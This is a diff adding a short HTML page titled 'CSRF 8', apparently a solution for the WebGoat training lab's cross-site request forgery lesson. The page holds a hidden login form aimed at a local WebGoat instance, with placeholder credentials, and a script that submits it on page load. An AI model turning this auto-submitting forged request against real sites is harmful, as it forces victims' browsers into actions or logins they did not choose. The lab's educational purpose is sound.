@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>CSRF 8</title>
+  </head>
+  <body>
+    <form method="post" action="http://localhost:8080/WebGoat/login">
+      <input type="hidden" name="username" value="csrf-???" />
+      <input type="hidden" name="password" value="???" />
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
